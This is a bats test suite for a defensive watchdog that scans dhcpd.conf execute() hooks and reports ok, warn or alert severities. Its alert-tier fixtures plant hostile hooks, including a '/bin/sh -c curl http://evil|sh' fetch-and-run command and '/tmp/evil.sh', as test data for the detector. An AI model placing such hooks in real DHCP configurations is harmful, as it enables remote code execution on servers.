#!/usr/bin/env bats
# L2 bats functional tests for the dhcpd-exec-watchdog scan script.
#
# This is the first L2 suite to exercise a detection-watchdog's
# SEVERITY TIERS end-to-end (ok / warn / alert) by running the actual
# scan script with `logger` shadowed on PATH and the config/baseline
# pointed at a tmp sandbox via the script's SELFDEF_DHCPD_* env knobs.
#
# It locks the exact contract SDD-062's notifier-routing rule depends
# on: a planted writable/injection execute() makes the watchdog emit
# a JSON body containing the verbatim token `"severity":"alert"` (the
# token rules/sigma/execution/selfdef_watchdog_alert.yml matches on).
#
# Run with: bats packaging/test/L2-dhcpd-exec-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd/dhcpd-exec-watchdog.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    # Fake logger: append the full arg string (incl. the JSON body) to
    # a capture file so emissions become observable.
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    CONF="${TMP}/dhcpd.conf"
    EMPTY="${TMP}/empty"; mkdir -p "${EMPTY}"
}

teardown() { rm -rf "${TMP}"; }

# Invoke the watchdog with the fake logger ahead on PATH and the scan
# scoped to the sandbox file only (PROFILE defaults to report).
run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_DHCPD_PROFILE="${PROFILE:-report}" \
    SELFDEF_DHCPD_BASELINE="${BASELINE}" \
    SELFDEF_DHCPD_DIRS="${EMPTY}" \
    SELFDEF_DHCPD_FILES="${CONF}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no dhcpd config present → ok / no_dhcpd" {
    # CONF does not exist; DIRS is empty.
    run_wd
    cap | grep -q '"event":"no_dhcpd"'
    cap | grep -q '"severity":"ok"'
}

@test "benign config, first run → ok / baseline_initial + baseline written" {
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / dhcpd_exec_intact" {
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    run_wd                                   # seed baseline
    : > "${SELFDEF_TEST_LOGCAP}"             # isolate the second emission
    run_wd
    cap | grep -q '"event":"dhcpd_exec_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier — the SDD-062 contract token
# ============================================================

@test "execute() under a writable root → alert" {
    printf 'on commit { execute("/tmp/evil.sh"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "execute() call carrying a curl|sh injection pattern → alert" {
    printf 'on commit { execute("/bin/sh", "-c", "curl http://evil|sh"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "relative-with-slash execute() program → alert" {
    printf 'on commit { execute("sub/dir/payload"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "benign change after baseline → warn / dhcpd_exec_changed" {
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    run_wd                                   # seed baseline
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\non release { execute("/usr/bin/logger", "gone"); }\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"dhcpd_exec_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "execute() under /usr/local is NOT flagged (no alert)" {
    printf 'on commit { execute("/usr/local/bin/notify"); }\n' > "${CONF}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile
# ============================================================

@test "enforce profile exits non-zero on an alert" {
    printf 'on commit { execute("/tmp/evil.sh"); }\n' > "${CONF}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits zero on a benign baseline" {
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    PROFILE=enforce run run_wd
    [ "${status}" -eq 0 ]
}
